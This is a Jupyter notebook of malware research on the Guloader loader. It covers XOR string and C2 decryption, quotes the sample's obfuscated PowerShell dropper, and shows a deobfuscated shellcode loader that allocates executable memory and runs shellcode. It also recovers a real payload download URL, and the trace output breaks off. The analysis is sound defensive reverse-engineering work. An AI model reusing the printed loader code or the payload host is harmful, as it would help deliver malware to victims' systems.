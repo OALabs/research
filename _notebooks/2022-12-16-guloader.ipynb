{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0e7e2f24-2f40-4782-9d01-098090363cce",
   "metadata": {},
   "source": [
    "# Guloader\n",
    "> A closer look at this infamous loader\n",
    "\n",
    "- toc: true \n",
    "- badges: true\n",
    "- categories: [guloader,unicorn,emulation,anti-debug,debugging,config]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "392c119f-31b6-4ee4-80e4-dedd4fa631c3",
   "metadata": {},
   "source": [
    "## Overview\n",
    "\n",
    "### Sample\n",
    "`14d52119459ef12be3a2f9a3a6578ee3255580f679b1b54de0990b6ba403b0fe` [malshare](https://malshare.com/sample.php?action=detail&hash=14d52119459ef12be3a2f9a3a6578ee3255580f679b1b54de0990b6ba403b0fe)\n",
    "\n",
    "\n",
    "### References\n",
    "\n",
    "- [Defeating Guloader Anti-Analysis Technique](https://unit42.paloaltonetworks.com/guloader-variant-anti-analysis/)\n",
    "- [Dissecting the new shellcode-based variant of GuLoader (CloudEyE)](https://www.spamhaus.com/resource-center/dissecting-the-new-shellcode-based-variant-of-guloader-cloudeye/)\n",
    "- [Spoofed Saudi Purchase Order Drops GuLoader – Part 2](https://www.fortinet.com/blog/threat-research/spoofed-saudi-purchase-order-drops-guloader-part-two)\n",
    "- [Malware Analysis: GuLoader Dissection Reveals New Anti-Analysis Techniques and Code Injection Redundancy (published after our notes)](https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/)\n",
    "- [Alex Hanel Unicorn Notes](https://github.com/alexander-hanel/unicorn-engine-noteshttps://github.com/alexander-hanel/unicorn-engine-notes)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b99c4704-18d6-4005-b389-6af76d889f66",
   "metadata": {},
   "source": [
    "## Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "721f0dd2-969c-4582-bb90-370cf5ef277c",
   "metadata": {},
   "source": [
    "### Stage 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6328ff08-a23f-429c-be60-89ca9a73da2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "file_data = open('/tmp/stage1.bin','rb').read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f6006c9-0362-40be-a2b3-f9c53a0838d7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import struct\n",
    "\n",
    "out = []\n",
    "key = struct.pack('<I',0x919E1E2E)\n",
    "code_offset = 0x0000014E \n",
    "enc_code = file_data[code_offset:]\n",
    "\n",
    "\n",
    "\n",
    "for i in range(len(enc_code)):\n",
    "    out.append(enc_code[i] ^ key[i % len(key)])\n",
    "\n",
    "open('/tmp/stage2.bin','wb').write(bytes(out))\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3399ce96-5109-49a2-bfe6-c38f18c30415",
   "metadata": {},
   "source": [
    "### Stage 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb8324f5-f31f-4b14-b98b-473fa47fc11c",
   "metadata": {},
   "outputs": [],
   "source": [
    "hex((0x96900857 + 0x10E451D0) ^ 0xAA6DFF89 ^ 0xD19A097)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "affa9c1b-4986-4b69-9f78-553953956392",
   "metadata": {},
   "outputs": [],
   "source": [
    "hex((0x191AE730 ^ 0x320EB5D5 ^ 0xB8DB25E1) + 0x6C3088FC)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b794d643-7fd5-4744-b61d-e85f9dfd664b",
   "metadata": {},
   "outputs": [],
   "source": [
    "hex((0xE22ECFA7 ^ 0xD05F809C ^ 0x4E1C381C) - 0x7C6D76C6)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2571ba82-fab0-4259-945f-06f6425b3f1a",
   "metadata": {},
   "outputs": [],
   "source": [
    "(0x1C90313A  ^ 0x0A3C51979 ^ 0x8A519DBE) - 0x3504B2FD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf8dd920-257d-4d99-888c-3f8bcf786f84",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "599b0ed0-7dba-49ab-8a2d-4ead6441f7e9",
   "metadata": {},
   "outputs": [],
   "source": [
    "buff = bytes.fromhex('D8 E3 A9 5E AB')\n",
    "buff2 = bytes.fromhex('b697cd32c7143eea5fb5fd3fa3dba8aaebe6226c89b9501c20806c888f58a2ba8ebc6b0a94e5bded795a2757109b8997d87e8080ee4aeb')\n",
    "\n",
    "out = []\n",
    "for i in range(len(buff2)):\n",
    "    out.append(buff2[i] ^ buff[i % len(buff)])\n",
    "    \n",
    "bytes(out)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8fb56bbf-9c08-4b48-9afa-47efe1aca71e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def xor_crypt(data, key):\n",
    "    out = []\n",
    "    for i in range(len(data)):\n",
    "        out.append(data[i] ^ key[i % len(key)])\n",
    "    return bytes(out)\n",
    "\n",
    "xor_crypt(buff, buff2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2bf09f61-84a3-4853-803f-0038e2840df4",
   "metadata": {},
   "outputs": [],
   "source": [
    "egg = xor_crypt(b'http', buff2)\n",
    "\n",
    "print(egg.hex())\n",
    "\n",
    "stage2_data = open('/tmp/stage2.bin','rb').read()\n",
    "\n",
    "c2_offset = stage2_data.find(egg)\n",
    "\n",
    "xor_crypt(stage2_data[c2_offset:c2_offset+100], buff2)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f3fb92e-6a0a-45f6-bcf0-6d8bacccab24",
   "metadata": {},
   "outputs": [],
   "source": [
    "hex(len(b'http://bounceclick.live/VVB/COrg_RYGGqN229.bin'))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1048e9e0-f2ba-4173-8289-461616f25058",
   "metadata": {},
   "source": [
    "## Guloader Deliver (PowerShell)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f93e11be-e21e-4aca-b685-9ddd5be2fdcf",
   "metadata": {},
   "source": [
    "### Sample\n",
    "\n",
    "`54976a776a08ddd4ab7cf1fb6b00c4a23f931f1a7d1d937922169ef3be7c9cae` [malshare](https://malshare.com/sample.php?action=detail&hash=54976a776a08ddd4ab7cf1fb6b00c4a23f931f1a7d1d937922169ef3be7c9cae)\n",
    "\n",
    "### Overview\n",
    "This sample also uses NSIS installer but instead of loading shellcode directly from the NSIS script they add an intermediate stage with PowerShell to further obfuscate the loader.\n",
    "\n",
    "### Analysis\n",
    "\n",
    "#### Stage 1\n",
    "Stage one is the NSIS script which is used to launch and obfuscated powershell script in the `Soothsaying.For` file. The script can be found on ghostbin [here](https://www.klgrth.io/paste/h2vm4)\n",
    "\n",
    "#### Stage 2 \n",
    "The obfuscated powershell contains a 3rd stage obfuscated powershell command in a variable that is deobfuscated and launched. We circomvented this by replacing the `IEX` execute commands with `Write-Output` print statements.\n",
    "\n",
    "#### Stage 3\n",
    "The obfuscatd powershell 3rd stage contains multiple encrypted strings which we have decrypted below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "05b33d6c-6ece-4aad-a1a9-84165b23a414",
   "metadata": {},
   "outputs": [],
   "source": [
    "ps_data = '''\n",
    "Function HTB {        param([String]$Humanmummy152);\n",
    "        $Sprjtende = New-Object byte[] ($Humanmummy152.Length / 2);\n",
    "        For($Stuphe=0; $Stuphe -lt $Humanmummy152.Length; $Stuphe+=2){                \n",
    "            $Sprjtende[$Stuphe/2] = [convert]::ToByte($Humanmummy152.Substring($Stuphe, 2), 16);\n",
    "            $Sprjtende[$Stuphe/2] = ($Sprjtende[$Stuphe/2] -bxor 141);\n",
    "        }       [String][System.Text.Encoding]::ASCII.GetString($Sprjtende);\n",
    "}$Fitchet0=HTB 'DEF4FEF9E8E0A3E9E1E1';\n",
    "$Fitchet1=HTB 'C0E4EEFFE2FEE2EBF9A3DAE4E3BEBFA3D8E3FEECEBE8C3ECF9E4FBE8C0E8F9E5E2E9FE';\n",
    "$Fitchet2=HTB 'CAE8F9DDFFE2EECCE9E9FFE8FEFE';\n",
    "$Fitchet3=HTB 'DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EB';\n",
    "$Fitchet4=HTB 'FEF9FFE4E3EA';\n",
    "$Fitchet5=HTB 'CAE8F9C0E2E9F8E1E8C5ECE3E9E1E8';\n",
    "$Fitchet6=HTB 'DFD9DEFDE8EEE4ECE1C3ECE0E8A1ADC5E4E9E8CFF4DEE4EAA1ADDDF8EFE1E4EE';\n",
    "$Fitchet7=HTB 'DFF8E3F9E4E0E8A1ADC0ECE3ECEAE8E9';\n",
    "$Fitchet8=HTB 'DFE8EBE1E8EEF9E8E9C9E8E1E8EAECF9E8';\n",
    "$Fitchet9=HTB 'C4E3C0E8E0E2FFF4C0E2E9F8E1E8';\n",
    "$udvalgsprocedure0=HTB 'C0F4C9E8E1E8EAECF9E8D9F4FDE8';\n",
    "$udvalgsprocedure1=HTB 'CEE1ECFEFEA1ADDDF8EFE1E4EEA1ADDEE8ECE1E8E9A1ADCCE3FEE4CEE1ECFEFEA1ADCCF8F9E2CEE1ECFEFE';\n",
    "$udvalgsprocedure2=HTB 'C4E3FBE2E6E8';\n",
    "$udvalgsprocedure3=HTB 'DDF8EFE1E4EEA1ADC5E4E9E8CFF4DEE4EAA1ADC3E8FADEE1E2F9A1ADDBE4FFF9F8ECE1';\n",
    "$udvalgsprocedure4=HTB 'DBE4FFF9F8ECE1CCE1E1E2EE';\n",
    "$udvalgsprocedure5=HTB 'E3F9E9E1E1';\n",
    "$udvalgsprocedure6=HTB 'C3F9DDFFE2F9E8EEF9DBE4FFF9F8ECE1C0E8E0E2FFF4';\n",
    "$udvalgsprocedure7=HTB 'C4C8D5';\n",
    "$udvalgsprocedure8=HTB 'D1';\n",
    "Set-Alias -name udvalgsprocedure9 -value $udvalgsprocedure7;\n",
    "function fkp {Param ($Ries, $Negeringsfunktionens)     ;\n",
    "$Kabar0 =HTB 'A9D8E3ECEFE9E4EEECF9E4FBE8ADB0ADA5D6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3CAE8F9CCFEFEE8E0EFE1E4E8FEA5A4ADF1ADDAE5E8FFE8A0C2EFE7E8EEF9ADF6ADA9D2A3CAE1E2EFECE1CCFEFEE8E0EFE1F4CEECEEE5E8ADA0CCE3E9ADA9D2A3C1E2EEECF9E4E2E3A3DEFDE1E4F9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B5A4D6A0BCD0A3C8FCF8ECE1FEA5A9CBE4F9EEE5E8F9BDA4ADF0A4A3CAE8F9D9F4FDE8A5A9CBE4F9EEE5E8F9BCA4';\n",
    "udvalgsprocedure9 $Kabar0;\n",
    "$Kabar5 = HTB 'A9DEFDE4E9FEE5ECE0E0E8FFE8FEADB0ADA9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9BFA1ADD6D9F4FDE8D6D0D0ADCDA5A9CBE4F9EEE5E8F9BEA1ADA9CBE4F9EEE5E8F9B9A4A4';\n",
    "udvalgsprocedure9 $Kabar5;\n",
    "$Kabar1 = HTB 'FFE8F9F8FFE3ADA9DEFDE4E9FEE5ECE0E0E8FFE8FEA3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5D6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBD0A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBA5A5C3E8FAA0C2EFE7E8EEF9ADC4E3F9DDF9FFA4A1ADA5A9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9B8A4A4A3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5A9DFE4E8FEA4A4A4A4A1ADA9C3E8EAE8FFE4E3EAFEEBF8E3E6F9E4E2E3E8E3FEA4A4';\n",
    "udvalgsprocedure9 $Kabar1;\n",
    "}function GDT {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $Ambilaevous,[Parameter(Position = 1)] [Type] $Malmy = [Void]);\n",
    "$Kabar2 = HTB 'A9CFE2FFE3E8E2ADB0ADD6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3C9E8EBE4E3E8C9F4E3ECE0E4EECCFEFEE8E0EFE1F4A5A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CCFEFEE8E0EFE1F4C3ECE0E8A5A9CBE4F9EEE5E8F9B5A4A4A1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3C8E0E4F9A3CCFEFEE8E0EFE1F4CFF8E4E1E9E8FFCCEEEEE8FEFED0B7B7DFF8E3A4A3C9E8EBE4E3E8C9F4E3ECE0E4EEC0E2E9F8E1E8A5A9CBE4F9EEE5E8F9B4A1ADA9EBECE1FEE8A4A3C9E8EBE4E3E8D9F4FDE8A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BDA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BCA1ADD6DEF4FEF9E8E0A3C0F8E1F9E4EEECFEF9C9E8E1E8EAECF9E8D0A4';\n",
    "udvalgsprocedure9 $Kabar2;\n",
    "$Kabar3 = HTB 'A9CFE2FFE3E8E2A3C9E8EBE4E3E8CEE2E3FEF9FFF8EEF9E2FFA5A9CBE4F9EEE5E8F9BBA1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CEECE1E1E4E3EACEE2E3FBE8E3F9E4E2E3FED0B7B7DEF9ECE3E9ECFFE9A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4';\n",
    "udvalgsprocedure9 $Kabar3;\n",
    "$Kabar4 = HTB 'A9CFE2FFE3E8E2A3C9E8EBE4E3E8C0E8F9E5E2E9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BFA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BEA1ADA9C0ECE1E0F4A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4';\n",
    "udvalgsprocedure9 $Kabar4;\n",
    "$Kabar5 = HTB 'FFE8F9F8FFE3ADA9CFE2FFE3E8E2A3CEFFE8ECF9E8D9F4FDE8A5A4';\n",
    "udvalgsprocedure9 $Kabar5   ;\n",
    "}$Nonperforated = HTB 'E6E8FFE3E8E1BEBF';\n",
    "$Brndselsforbrug = HTB 'F8FEE8FFBEBF';\n",
    "$Sottishness03 = HTB 'CAE8F9CEE2E3FEE2E1E8DAE4E3E9E2FA';\n",
    "$Sottishness00=HTB 'DEE5E2FADAE4E3E9E2FA';\n",
    "$Kabar6 = HTB 'A9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B9A4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';\n",
    "udvalgsprocedure9 $Kabar6;\n",
    "$Sottishness01 = HTB 'A9E3E2E3E9E4FDF9E8FFE2F8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9CFFFE3E9FEE8E1FEEBE2FFEFFFF8EAADA9DEE2F9F9E4FEE5E3E8FEFEBDBDA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';\n",
    "udvalgsprocedure9 $Sottishness01;\n",
    "$Sottishness02 = HTB 'A9C9E2FAE3EEFFE4E8E9ADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9DEE2F9F9E4FEE5E3E8FEFEBDBEA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';\n",
    "udvalgsprocedure9 $Sottishness02;\n",
    "$Kabar7 = HTB 'A9D8E3EEF8E1F9E4FBECEFE1E8ADB0ADA9C9E2FAE3EEFFE4E8E9A3C4E3FBE2E6E8A5BDA4';\n",
    "udvalgsprocedure9 $Kabar7;\n",
    "$Kabar7 = HTB 'A9E3E2E3E9E4FDF9E8FFE2F8FEA3C4E3FBE2E6E8A5A9D8E3EEF8E1F9E4FBECEFE1E8A1ADBDA4';\n",
    "udvalgsprocedure9 $Kabar7;\n",
    "$Sottishness04 = fkp $udvalgsprocedure5 $udvalgsprocedure6;\n",
    "$Kabar7 = HTB 'A9CEECFEF8E4FEF9E4EEECE1E1F4BEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBEBCBBA1ADBDF5BEBDBDBDA1ADBDF5B9BDA4';\n",
    "udvalgsprocedure9 $Kabar7;\n",
    "$Kabar8 = HTB 'A9D8E3FEECE4E3F9E1E4E3E8FEFEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBDF5BCBDBDBDBDBDA1ADBDF5BEBDBDBDA1ADBDF5B9A4';\n",
    "udvalgsprocedure9 $Kabar8;\n",
    "$Casuistically2=\"rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrpdgaaaslraoddernnoanlergpaeyeefaonoaiitiiuahhglkkaedazrrafrecrcieennipurralanidnkeueraeapeaoaoeofrreevlrxuutefyinuireraanslealiieaaodrrclieeiuauraorreeoeboeojjluricahanieasaneueuaeleohnmriarlioaaegtralioleraonearouvoieobohrveneeaafodeiiitinotdieieplaleeideoooeaaorrntiaiaotopnehekeatlriovaaadlnaoionauitinuaalnrevioeeetspnleeenoloeeeouuinrpuaijojoaovaoarroyopoaynupnoamouamsmpdundpuoinruuraroyanrsenifeaeuopernoeiilauhcricaokcarodvoorbaioelcloauemaauuijtlrrrntaarreaoutneayenpkrwieeokenleioeerkoseeouapauunoleydriakeaexaneeupiuhaiovantesneoeuaaaigyokhieoiroarueivuoetnliisnunyeiaupogylhieetuaoutejdioleakriiaaeheaictaeuaeonutlexseosfkoaeeepknkrnpueeaoeiuamyhvenpluoymohaauoiyaostiuindklaeyapeayloaoaasnyehoorerpeevraooiietoaaeeooieloiirsayadnaeaaaiftrooidvalauieaeearnonaevuuyaerelkoaduecoayonsaroieueiaiiovunriisolkosuaaroeayiuoiiaureeyatdnureafnnaevhnhaitlryrrkupuofbmrrpiunnuakarkalohnuoudeyriegnrdejivnonnnkevruugeoeleoanalahsaoylapenujpiueemiieuludkudeeesloreieeleiaarlaohvnouarurlveurrorumetnvnpruinnhremoleiikooialteieersidbpigneuoprloelyvooyavennipaaiepafenokaeiaeraeteiweoevgakrouaktatilsunqleoefnugiaevaeamnuarnoiinelr\"\n",
    "'''\n",
    "import re\n",
    "\n",
    "def decrypt(data,key):\n",
    "    tmp_data = bytes.fromhex(data)\n",
    "    out = []\n",
    "    for c in tmp_data:\n",
    "        out.append(c ^ key)\n",
    "    return bytes(out)\n",
    "\n",
    "\n",
    "egg = r\"HTB '([^']*)'\"\n",
    "\n",
    "str_map = {}\n",
    "\n",
    "for m in re.finditer(egg, ps_data):\n",
    "    data = m.group(1)\n",
    "    ptxt_data = decrypt(data, 141)\n",
    "    str_map[m.group()] = ptxt_data.decode('utf-8')\n",
    "\n",
    "for k in str_map:\n",
    "    ps_data = ps_data.replace(k,\"'\" + str_map[k] + \"'\")\n",
    "\n",
    "print(ps_data)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac0e6180-9e50-49f6-81f6-cc7bb8d787af",
   "metadata": {},
   "source": [
    "#### Shellcode Loader\n",
    "\n",
    "Once the strings have been decrypted it is clear that the powershell is used to read shellcode from the `Semiskilled.Slv` file. This code is split at 0x400 and 0x53c and copied into two allocated buffers. The first buffer is then called and the second buffer passed as an argument along with a pointer to `NtProtectVirtualMemory`.\n"
   ]
  },
  {
   "cell_type": "raw",
   "id": "c49e350d-2e1d-49ad-a531-7574800de1b1",
   "metadata": {},
   "source": [
    "$Buffer1_RWX = $VirtualAlloc.Invoke([IntPtr]::Zero,     316, 0x3000, PAGE_EXECUTE_READWRITE)\n",
    "$Buffer2_RW = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x100000, 0x3000, PAGE_READWRITE)\n",
    "\n",
    "$ShellCode = [System.IO.File]::ReadAllBytes('$env:LOCALAPPDATA\\Ecphorize\\Gonocoele\\Semiskilled.Slv')\n",
    "\n",
    "[System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 1024,  $Buffer1_RWX , 316)\n",
    "\n",
    "[System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 316+1024, $Buffer2_RW , $ShellCode.count-316-1024)\n",
    "\n",
    "$ShellCodeEntry = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Buffer1_RWX , (GDT @([IntPtr],[IntPtr]) ([Void])))\n",
    "\n",
    "$ShellCodeEntry.Invoke($Buffer2_RW , fkp ntdll NtProtectVirtualMemory)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13f542b4-97a2-47c9-a2bf-7dceedc3c976",
   "metadata": {},
   "source": [
    "#### Guloader Shellcode Stage 1\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2dcaabc-a109-4a3b-a07b-eb9ca3fa5cb4",
   "metadata": {},
   "source": [
    "The first stage of the shellcode has heavy obfuscation but it is a simple loader and decryptor used to decrypt the buffer that is passed as an argument from the PowerShells script. The decryption is an XOR with the key 0xA980E98A.\n",
    "\n",
    "\n",
    "```cpp\n",
    "void __usercall sub_0(int a1@<ebp>, void (*a2)(void), int a3)\n",
    "{\n",
    "  int v3; // ebp\n",
    "  void (__stdcall *v4)(int, int, int, int, int); // edx\n",
    "  int v5; // esi\n",
    "  int v6; // ecx\n",
    "  int i; // eax\n",
    "\n",
    "  v3 = a1 - 768;\n",
    "  *(_DWORD *)(v3 + 256) = 0x100000;\n",
    "  *(_DWORD *)(v3 + 260) = a2;\n",
    "  v4 = (void (__stdcall *)(int, int, int, int, int))(a3 + 5);\n",
    "  v5 = 0;\n",
    "  v6 = 0;\n",
    "  while ( 1 )\n",
    "  {\n",
    "    do\n",
    "      ++v6;\n",
    "    while ( *(_DWORD *)((char *)v4 + v6) != *(_DWORD *)(a3 + 5) );\n",
    "    ++v5;\n",
    "    if ( *(_BYTE *)(a3 + v6) == 0xB8 )\n",
    "    {\n",
    "      v4(-1, v3 + 260, v3 + 256, 64, v3 + 156);\n",
    "      for ( i = 0; i != 0x29B28; i += 4 )\n",
    "        *(_DWORD *)((char *)a2 + i) ^= 0xA980E98A;\n",
    "      a2();\n",
    "      JUMPOUT(0x13C);\n",
    "    }\n",
    "  }\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0ae51964-90f4-4ead-a7d0-7df707b6e97c",
   "metadata": {},
   "source": [
    "#### Guloader Shellcode Stage 2\n",
    "The second stage shellcode is a version of the main guloader stage2 shellcode. Some of the same functions exist in this shellcode as the original shellcode we analyzed above.\n",
    "\n",
    "key_len = 44\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "440536bf-0962-46e2-82ea-fb0426396881",
   "metadata": {},
   "outputs": [],
   "source": [
    "key = bytes.fromhex('3d4f0b6d845f58cbf8844e9ab35781156c68109175e8c42901f8ee2b78c4926631939c778b2a48e0d8ea0dd585')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "b148ee9f-47f0-4a90-82cb-cac58ad5de86",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "553b7f1d\n",
      "-1\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b''"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def xor_crypt(data, key):\n",
    "    out = []\n",
    "    for i in range(len(data)):\n",
    "        out.append(data[i] ^ key[i % len(key)])\n",
    "    return bytes(out)\n",
    "\n",
    "egg = xor_crypt(b'http', key)\n",
    "\n",
    "print(egg.hex())\n",
    "\n",
    "stage2_data = open('/tmp/Semiskilled.Slv_shellcode_stage_2_patched.bin','rb').read()\n",
    "\n",
    "c2_offset = stage2_data.find(egg)\n",
    "print(c2_offset)\n",
    "\n",
    "xor_crypt(stage2_data[c2_offset:c2_offset+100], key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "182a921f-7a3f-46c1-b571-96d62f5c9d47",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'user32'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data = bytes.fromhex('48 4F 78 6D E1 5F 2A CB CB 84 7C 9A')\n",
    "xor_crypt(data, key).replace(b'\\x00',b'')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "798bb3ee-aad6-44a2-8f94-3fb0200c5690",
   "metadata": {},
   "source": [
    "#### VEH Program Flow Redirection\n",
    "\n",
    "As described in both the [CrowdStrike](https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/) and [Unit42](https://unit42.paloaltonetworks.com/guloader-variant-anti-analysis/) blogs Guloader uses an VEH to both do some anti-debugging checks and redirect the program flow.\n",
    "\n",
    "The way this works is the VEH redirects EIP using a decoding routing based on byte the follows the INT3 (`cc`) instruction which caused the excpetion. In the code `jmp` instructions have been replaced with INT3 and an encoded byte. There is a nice [IDA Python plugin](https://github.com/pan-unit42/public_tools/blob/master/idapython-guloader-anti-analysis/guloader_veh_anti_analysis_.py) from Unit42 that will automatically replace the INT3 code with JMPs. ** Remember you need to update the XOR byte in the plugin for the version of guloader you are analyzing.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0fa214f1-9834-43b6-8902-44dc1aa51ea2",
   "metadata": {},
   "source": [
    "#### String Decryption\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "0195b486-26c1-4ccf-9b9d-862894be3f54",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "EIP: 0x8a55\n",
      "EIP: 0x8a57\n",
      "EIP: 0x8a59\n",
      "EIP: 0x8a5d\n",
      "EIP: 0x8a63\n",
      "EIP: 0x8a69\n",
      "EIP: 0x8a6f\n",
      "EIP: 0x8a75\n",
      "EIP: 0x8a77\n",
      "EIP: 0x8a7d\n",
      "EIP: 0x8a80\n",
      "EIP: 0x8a85\n",
      "EIP: 0x8a8b\n",
      "EIP: 0x8a8d\n",
      "EIP: 0x8a90\n",
      "EIP: 0x8a96\n",
      "EIP: 0x8a98\n",
      "EIP: 0x8a9e\n",
      "EIP: 0x8aa0\n",
      "EIP: 0x8aa2\n",
      "EIP: 0x8aa8\n",
      "EIP: 0x8aae\n",
      "EIP: 0x8ab4\n",
      "EIP: 0x8b0e\n",
      "EIP: 0x8b11\n",
      "EIP: 0x8b17\n",
      "EIP: 0x8b19\n",
      "EIP: 0x8b1f\n",
      "EIP: 0x8b21\n",
      "EIP: 0x8b27\n",
      "EIP: 0x8b2d\n",
      "EIP: 0x8b30\n",
      "EIP: 0x8b35\n",
      "EIP: 0x8b39\n",
      "EIP: 0x8b3b\n",
      "EIP: 0x8b40\n",
      "EIP: 0x8b45\n",
      "EIP: 0x8b47\n",
      "EIP: 0x8b4c\n",
      "EIP: 0x8b4e\n",
      "EIP: 0x8b54\n",
      "EIP: 0x8b56\n",
      "EIP: 0x8b96\n",
      "EIP: 0x8b9c\n",
